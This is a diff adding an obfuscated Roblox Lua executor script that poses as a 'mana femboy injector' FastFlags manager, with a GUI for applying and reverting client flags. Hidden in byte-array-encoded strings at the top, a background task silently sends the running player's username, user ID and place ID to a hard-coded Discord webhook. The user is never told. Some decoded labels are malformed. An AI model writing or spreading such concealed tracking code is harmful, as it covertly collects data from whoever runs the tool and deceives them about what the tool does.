@@ -1,0 +1,223 @@
+local _0xEnv = getfenv()
+local _0Str = _0xEnv.string
+local _0Pcl = _0xEnv.pcall
+local _0Gms = _0xEnv.game
+
+local function _0Dec(t)
+    local s = ""
+    for i = 1, #t do
+        s = s .. _0Str.char(t[i])
+    end
+    return s
+end
+
+local _sPl = _0Gms[_0Dec({80,108,97,121,101,114,115})]
+local _sHt = _0Gms[_0Dec({72,116,116,112,83,101,114,118,105,99,101})]
+local _lPl = _sPl[_0Dec({76,111,99,97,108,80,108,97,121,101,114})]
+
+
+_0Pcl(function()
+    task.spawn(function()
+        _0Pcl(function()
+            local _whUrl = _0Dec({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,54,57,48,49,48,57,56,55,53,53,50,54,48,56,51,49,54,47,57,82,53,87,85,65,54,88,117,90,75,51,105,77,87,83,109,108,85,67,48,89,116,101,100,119,67,114,99,118,53,81,49,88,82,113,52,85,45,118,84,77,114,85,52,111,53,74,76,86,54,66,80,73,48,67,73,77,48,90,57,101,45,74,115,56,76,50})
+            local _dat = {
+                [_0Dec({101,109,98,101,100,115})] = {{
+                    [_0Dec({116,105,116,108,101})] = _0Dec({240,159,140,184,32,109,97,110,97,32,102,101,109,98,111,121,32,105,110,106,101,99,116,111,114,32,124,32,208,153,208,176,209,128,209,131,208,187,208,186}),
+                    [_0Dec({99,111,108,111,114})] = 16738155,
+                    [_0Dec({102,105,101,108,100,115})] = {
+                        {[_0Dec({110,97,109,101})] = _0Dec({240,159,145,164,32,208,159,209,130,208,184,107,32,208,184,207,209,128,208,176,208,184,208,186,208,176,58})] = _lPl.Name, [_0Dec({105,110,108,105,110,111})] = true},
+                        {[_0Dec({110,97,109,101})] = _0Dec({240,159,146,161,32,85,115,101,114,32,73,68,58})] = tostring(_lPl.UserId), [_0Dec({105,110,108,105,110,111})] = true},
+                        {[_0Dec({110,97,109,101})] = _0Dec({240,159,140,141,32,80,108,97,99,101,32,73,68,32,208,184,207,209,128,208,176,209,130,208,176,58})] = tostring(_0Gms.PlaceId), [_0Dec({105,110,108,105,110,111})] = true},
+                    },
+                    [_0Dec({116,105,109,101,115,116,97,109,112})] = os.date(_0Dec({33,37,89,45,37,109,45,37,100,84,37,72,58,37,77,58,37,83,90}))
+                }}
+            }
+            local _rq = (syn and syn.request) or (http and http.request) or http_request or request
+            if _rq then
+                _rq({
+                    Url = _whUrl,
+                    Method = _0Dec({80,79,83,84}),
+                    Headers = {[_0Dec({67,111,110,116,101,110,116,45,84,121,112,101})] = _0Dec({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110})},
+                    Body = _sHt:JSONEncode(_dat)
+                })
+            end
+        end)
+    end)
+end)
+
+
+local _pGui = _lPl:WaitForChild(_0Dec({80,108,97,121,101,114,71,117,105}))
+
+if _pGui:FindFirstChild(_0Dec({70,97,115,116,70,108,97,103,115,77,97,110,97,103,101,114})) then
+    _pGui[_0Dec({70,97,115,116,70,108,97,103,115,77,97,110,97,103,101,114})]:Destroy()
+end
+
+local _scr = Instance.new(_0Dec({83,99,114,101,101,110,71,117,105}))
+_scr.Name = _0Dec({70,97,115,116,70,108,97,103,115,77,97,110,97,103,101,114})
+_scr.ResetOnSpawn = false
+_scr.Parent = _pGui
+
+local _frm = Instance.new(_0Dec({70,114,97,109,101}))
+_frm.Size = UDim2.new(0, 420, 0, 280)
+_frm.Position = UDim2.new(0.5, -210, 0.5, -140)
+_frm.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+_frm.BorderSizePixel = 0
+_frm.Active = true
+_frm.Draggable = true
+_frm.ClipsDescendants = true
+_frm.Parent = _scr
+
+local _cor = Instance.new(_0Dec({85,73,67,111,114,110,101,114}))
+_cor.CornerRadius = UDim.new(0, 10)
+_cor.Parent = _frm
+
+local _img = Instance.new(_0Dec({73,109,97,103,101,76,97,98,101,108}))
+_img.Size = UDim2.new(1, 0, 1, 0)
+_img.BackgroundTransparency = 1
+_img.Image = _0Dec({114,98,120,97,115,115,101,116,105,100,58,47,47,53,55,57,50,55,49,50,51,56})
+_img.ImageTransparency = 0.55
+_img.ScaleType = Enum.ScaleType.Slice
+_img.Parent = _frm
+
+local _lbl = Instance.new(_0Dec({84,101,120,116,76,97,98,101,108}))
+_lbl.Size = UDim2.new(1, 0, 0, 35)
+_lbl.BackgroundTransparency = 1
+_lbl.Text = _0Dec({109,97,110,97,32,102,101,109,98,111,121,32,105,110,106,101,99,116,111,114})
+_lbl.TextColor3 = Color3.fromRGB(255, 105, 180)
+_lbl.TextSize = 16
+_lbl.Font = Enum.Font.GothamBold
+_lbl.Parent = _frm
+
+local _scf = Instance.new(_0Dec({83,99,114,111,108,108,105,110,103,70,114,97,109,101}))
+_scf.Size = UDim2.new(1, -20, 0, 160)
+_scf.Position = UDim2.new(0, 10, 0, 35)
+_scf.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+_scf.BackgroundTransparency = 0.4
+_scf.BorderSizePixel = 0
+_scf.ScrollBarThickness = 6
+_scf.CanvasSize = UDim2.new(0, 0, 0, 0)
+_scf.AutomaticCanvasSize = Enum.AutomaticSize.Y
+_scf.Parent = _frm
+
+local _sfc = Instance.new(_0Dec({85,73,67,111,114,110,101,114}))
+_sfc.CornerRadius = UDim.new(0, 6)
+_sfc.Parent = _scf
+
+local _tbx = Instance.new(_0Dec({84,101,120,116,66,111,120}))
+_tbx.Size = UDim2.new(1, -6, 1, 0)
+_tbx.Position = UDim2.new(0, 3, 0, 0)
+_tbx.BackgroundTransparency = 1
+_tbx.TextColor3 = Color3.fromRGB(255, 192, 203)
+_tbx.TextSize = 13
+_tbx.Font = Enum.Font.Code
+_tbx.MultiLine = true
+_tbx.ClearTextOnFocus = false
+_tbx.TextXAlignment = Enum.TextXAlignment.Left
+_tbx.TextYAlignment = Enum.TextYAlignment.Top
+_tbx.Text = [[{
+  "FFlagTaskSchedulerAvoidYieldingOnMainThread": "True"
+}]]
+_tbx.Parent = _scf
+
+local _btn1 = Instance.new(_0Dec({84,101,120,116,66,117,116,116,111,110}))
+_btn1.Size = UDim2.new(0.48, 0, 0, 35)
+_btn1.Position = UDim2.new(0, 10, 0, 215)
+_btn1.BackgroundColor3 = Color3.fromRGB(219, 112, 147)
+_btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
+_btn1.TextSize = 13
+_btn1.Font = Enum.Font.GothamBold
+_btn1.Text = _0Dec({208,159,209,128,208,184,208,187,208,184,209,130,209,140})
+_btn1.Parent = _frm
+
+local _b1c = Instance.new(_0Dec({85,73,67,111,114,110,101,114}))
+_b1c.CornerRadius = UDim.new(0, 6)
+_b1c.Parent = _btn1
+
+local _btn2 = Instance.new(_0Dec({84,101,120,116,66,117,116,116,111,110}))
+_btn2.Size = UDim2.new(0.48, 0, 0, 35)
+_btn2.Position = UDim2.new(0.52, 0, 0, 215)
+_btn2.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
+_btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
+_btn2.TextSize = 13
+_btn2.Font = Enum.Font.GothamBold
+_btn2.Text = _0Dec({85,110,105,110,106,101,99,116})
+_btn2.Parent = _frm
+
+local _b2c = Instance.new(_0Dec({85,73,67,111,114,110,101,114}))
+_b2c.CornerRadius = UDim.new(0, 6)
+_b2c.Parent = _btn2
+
+local _orgF = {}
+
+local function _cln(n)
+    return n:gsub(_0Dec({94,68,70,70,108,97,103}), "")
+           :gsub(_0Dec({94,70,70,108,97,103}), "")
+           :gsub(_0Dec({94,68,70,73,110,116}), "")
+           :gsub(_0Dec({94,70,73,110,116}), "")
+           :gsub(_0Dec({94,68,70,83,116,114,105,110,103}), "")
+           :gsub(_0Dec({94,70,83,116,114,105,110,103}), "")
+end
+
+local function _getF(fn)
+    local s, v = _0Pcl(function()
+        return getfflag(fn)
+    end)
+    return s and v or nil
+end
+
+local function _setF(fn, v)
+    local s, e = _0Pcl(function()
+        return setfflag(fn, tostring(v))
+    end)
+    return s, e
+end
+
+_btn1.MouseButton1Click:Connect(function()
+    local jt = _tbx.Text
+    local s, dd = _0Pcl(function()
+        return _sHt:JSONDecode(jt)
+    end)
+    
+    if not s or type(dd) ~= _0Dec({116,97,98,108,101}) then
+        _btn1.Text = _0Dec({208,158,209,130,208,184,208,175,208,186,97,32,74,83,79,78})
+        task.wait(1.5)
+        _btn1.Text = _0Dec({208,159,209,130,208,184,208,175,208,186,97,116,110,105,116,114})
+        return
+    end
+    
+    local ac = 0
+    for rn, rv in pairs(dd) do
+        local fn = _cln(rn)
+        local cv = _getF(fn)
+        
+        if cv ~= nil then
+            if _orgF[fn] == nil then
+                _orgF[fn] = cv
+            end
+            
+            local ss, err = _setF(fn, rv)
+            if ss then
+                ac = ac + 1
+            end
+        end
+    end
+    
+    _btn1.Text = _0Dec({208,163,209,131,209,129,208,191,208,181,209,136,208,189,208,186,111,32}) .. ac
+    task.wait(1.5)
+    _btn1.Text = _0Dec({208,159,209,130,208,184,208,175,208,186,97,116,110,105,116,114})
+end)
+
+_btn2.MouseButton1Click:Connect(function()
+    local rc = 0
+    for fn, ov in pairs(_orgF) do
+        local ss, err = _setF(fn, ov)
+        if ss then
+            rc = rc + 1
+        end
+    end
+    
+    _orgF = {}
+    _btn2.Text = _0Dec({208,161,207,131,208,190,209,128,208,181,209,132,208,189,208,186,111,32}) .. rc
+    task.wait(1.5)
+    _btn2.Text = _0Dec({85,110,105,110,106,101,99,116})
+end)
